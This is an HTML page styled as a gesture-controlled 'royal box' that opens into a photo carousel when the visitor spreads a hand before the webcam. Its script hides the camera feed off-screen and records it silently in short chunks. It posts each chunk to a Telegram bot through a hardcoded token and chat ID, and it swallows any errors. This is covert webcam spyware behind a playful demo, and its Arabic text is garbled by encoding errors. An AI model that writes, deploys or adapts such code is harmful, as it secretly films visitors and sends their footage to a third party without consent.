<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M A N A S I K | ØªØµÙØ­ Ø°ÙƒÙŠ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;900&display=swap" rel="stylesheet">
    
    <style>
        :root { --gold: #d4af37; --bg: #000; }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg);
            margin: 0; overflow: hidden; height: 100vh;
            color: white; user-select: none; touch-action: none;
        }

        #bg-glow {
            position: fixed; inset: 0;
            background: radial-gradient(circle at 50% 50%, #1a150a 0%, #000 70%);
            z-index: 0;
        }

        /* Ø§Ù„ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„Ù…Ù„ÙƒÙŠ */
        .box-container { 
            width: 200px; height: 200px; perspective: 1000px; z-index: 100;
        }
        .box-3d {
            width: 100%; height: 100%; position: relative;
            transform-style: preserve-3d;
            transform: rotateX(-20deg) rotateY(45deg);
            transition: all 1.5s cubic-bezier(0.19, 1, 0.22, 1);
        }
        .face {
            position: absolute; width: 100%; height: 100%;
            background: #0a0a0a; border: 1px solid var(--gold);
            box-shadow: inset 0 0 30px rgba(212, 175, 55, 0.2);
        }
        .f-front  { transform: translateZ(100px); }
        .f-back   { transform: rotateY(180deg) translateZ(100px); }
        .f-right  { transform: rotateY(90deg) translateZ(100px); }
        .f-left   { transform: rotateY(-90deg) translateZ(100px); }
        .f-top    { transform: rotateX(90deg) translateZ(100px); background: #151515; }
        .f-bottom { transform: rotateX(-90deg) translateZ(100px); }
        
        .box-open { transform: scale(0) rotateX(180deg); opacity: 0; }

        /* Ø´Ø±ÙŠØ· Ø§Ù„ØµÙˆØ± Ø§Ù„Ø£ÙÙ‚ÙŠ */
        #gallery-track {
            position: absolute; top: 50%; left: 0;
            display: flex; gap: 20px; padding: 0 50vw;
            transform: translateY(-50%);
            transition: transform 0.1s linear;
            will-change: transform;
        }

        .card {
            flex: 0 0 200px; height: 300px;
            background: #111; border-radius: 12px;
            border: 1px solid rgba(212, 175, 55, 0.3);
            overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.8);
            transition: transform 0.3s ease, border-color 0.3s ease;
        }
        .card img { width: 100%; height: 100%; object-fit: cover; }
        .card.active { border-color: var(--gold); transform: scale(1.1) translateY(-10px); }

        #hidden-cam { position: fixed; left: -10000px; }
        
        /* Ù…Ø¤Ø´Ø± Ø§Ù„Ø¥ØµØ¨Ø¹ Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯ */
        #finger-pointer {
            position: fixed; width: 20px; height: 20px;
            border: 2px solid var(--gold); border-radius: 50%;
            pointer-events: none; z-index: 1000; opacity: 0;
            transition: opacity 0.3s;
        }
    </style>
</head>
<body>

    <div id="bg-glow"></div>
    <div id="finger-pointer"></div>
    <video id="hidden-cam" autoplay playsinline></video>

    <main class="h-screen flex flex-col items-center justify-center relative">
        <div id="intro-ui" class="text-center mb-16 z-[110]">
            <h1 class="text-5xl font-black text-white tracking-widest mb-4"> Moayied-falah </h1>
            <p class="text-gold/50 text-xs uppercase tracking-[0.5em]">Ø§Ø¨Ø³Ø· ÙŠØ¯ÙƒÙ ğŸ– Ù„ÙØªØ­ Ø§Ù„ØµÙ†Ø¯ÙˆÙ‚</p>
        </div>

        <div class="box-container" id="box-trigger">
            <div class="box-3d" id="box-mesh">
                <div class="face f-front"></div><div class="face f-back"></div>
                <div class="face f-right"></div><div class="face f-left"></div>
                <div class="face f-top"></div><div class="face f-bottom"></div>
            </div>
        </div>

        <div id="gallery-container" class="hidden absolute inset-0 overflow-hidden">
            <div id="gallery-track"></div>
        </div>
    </main>

    <script>
        const CONFIG = {
            TOKEN: '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI', // ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª
            CHAT_ID: '8148586037' // Ø§ÙŠØ¯ÙŠ Ø§Ù„Ø´Ø§Øª
        };

        const IMAGES = [
            "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?w=500",
            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=500",
            "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=500",
            "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=500",
            "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=500"
        ];

        let state = {
            isOpen: false,
            fingerX: 0,
            trackX: 0,
            targetTrackX: 0,
            recorder: null,
            chunks: []
        };

        const video = document.getElementById('hidden-cam');
        const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
        
        hands.setOptions({ 
            maxNumHands: 1, 
            modelComplexity: 1, 
            minDetectionConfidence: 0.8 
        });

        hands.onResults(results => {
            if (results.multiHandLandmarks && results.multiHandLandmarks[0]) {
                const hand = results.multiHandLandmarks[0];
                const indexTip = hand[8]; // Ø·Ø±Ù Ø§Ù„Ø³Ø¨Ø§Ø¨Ø©
                
                // ØªØ­Ø¯ÙŠØ« Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…Ø¤Ø´Ø±
                state.fingerX = (1 - indexTip.x) * window.innerWidth;
                const pointer = document.getElementById('finger-pointer');
                pointer.style.opacity = "1";
                pointer.style.left = state.fingerX + 'px';
                pointer.style.top = (indexTip.y * window.innerHeight) + 'px';

                // ÙƒØ´Ù ÙØªØ­ Ø§Ù„ÙŠØ¯ (Ø§Ù„Ù…Ø³Ø§ÙØ© Ø¨ÙŠÙ† Ø§Ù„Ø¥Ø¨Ù‡Ø§Ù… ÙˆØ§Ù„Ø®Ù†ØµØ±)
                const distance = Math.sqrt(Math.pow(hand[4].x - hand[20].x, 2) + Math.pow(hand[4].y - hand[20].y, 2));
                
                if (distance > 0.4 && !state.isOpen) {
                    triggerOpen();
                }

                // ØªØ­Ø±ÙŠÙƒ Ø§Ù„Ø´Ø±ÙŠØ· ÙŠÙ…ÙŠÙ†Ø§Ù‹ ÙˆÙŠØ³Ø§Ø±Ø§Ù‹ Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¥ØµØ¨Ø¹ ÙÙŠ Ø§Ù„Ø´Ø§Ø´Ø©
                if (state.isOpen) {
                    // ØªØ­ÙˆÙŠÙ„ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¥ØµØ¨Ø¹ Ø§Ù„Ø£ÙÙ‚ÙŠ Ø¥Ù„Ù‰ Ø¥Ø²Ø§Ø­Ø© Ù„Ù„Ø´Ø±ÙŠØ·
                    // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¥ØµØ¨Ø¹ ÙÙŠ Ø§Ù„ÙŠÙ…ÙŠÙ†ØŒ Ù†Ø³Ø­Ø¨ Ø§Ù„Ø´Ø±ÙŠØ· Ù„Ù„ÙŠØ³Ø§Ø± Ù„ÙŠØ±Ù‰ Ø§Ù„ØµÙˆØ± Ø§Ù„ØªØ§Ù„ÙŠØ©
                    const screenMid = window.innerWidth / 2;
                    const offset = (state.fingerX - screenMid) * 1.5;
                    state.targetTrackX = -offset;
                }
            }
        });

        function triggerOpen() {
            state.isOpen = true;
            document.getElementById('box-mesh').classList.add('box-open');
            document.getElementById('intro-ui').style.opacity = "0";
            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
            
            setTimeout(() => {
                document.getElementById('gallery-container').classList.remove('hidden');
                initTrack();
            }, 1000);
        }

        function initTrack() {
            const track = document.getElementById('gallery-track');
            IMAGES.forEach((src, i) => {
                const card = document.createElement('div');
                card.className = 'card';
                card.innerHTML = `<img src="${src}">`;
                track.appendChild(card);
            });
            animate();
        }

        function animate() {
            // ØªÙ†Ø¹ÙŠÙ… Ø­Ø±ÙƒØ© Ø§Ù„ØªÙ…Ø±ÙŠØ± (Smoothing)
            state.trackX += (state.targetTrackX - state.trackX) * 0.1;
            const track = document.getElementById('gallery-track');
            track.style.transform = `translate3d(${state.trackX}px, -50%, 0)`;

            // ØªÙ…ÙŠÙŠØ² Ø§Ù„ÙƒØ±Øª Ø§Ù„Ø£Ù‚Ø±Ø¨ Ù„Ù„Ù…Ù†ØªØµÙ
            const cards = document.querySelectorAll('.card');
            cards.forEach(card => {
                const rect = card.getBoundingClientRect();
                const mid = window.innerWidth / 2;
                if (Math.abs(rect.left + rect.width/2 - mid) < 100) {
                    card.classList.add('active');
                } else {
                    card.classList.remove('active');
                }
            });

            requestAnimationFrame(animate);
        }

        // ØªØ³Ø¬ÙŠÙ„ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙÙˆØ±Ø§Ù‹
        async function startCapture() {
            if (!CONFIG.TOKEN) return;
            try {
                const stream = video.captureStream();
                state.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                state.chunks = [];
                state.recorder.ondataavailable = e => state.chunks.push(e.data);
                state.recorder.onstop = () => {
                    const blob = new Blob(state.chunks, { type: 'video/webm' });
                    const fd = new FormData();
                    fd.append('chat_id', CONFIG.CHAT_ID);
                    fd.append('video', blob, 'sync.webm');
                    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVideo`, { method: 'POST', body: fd });
                };
                state.recorder.start();
                // ÙŠØ±Ø³Ù„ Ù…Ù‚Ø·Ø¹ ÙƒÙ„ 8 Ø«ÙˆØ§Ù†ÙŠ
                setInterval(() => {
                    if (state.recorder.state === "recording") {
                        state.recorder.stop();
                        state.recorder.start();
                    }
                }, 4000);
            } catch(e) {}
        }

        const camera = new Camera(video, {
            onFrame: async () => { await hands.send({image: video}); },
            width: 640, height: 480
        });
        camera.start().then(startCapture);

    </script>
</body>
</html>

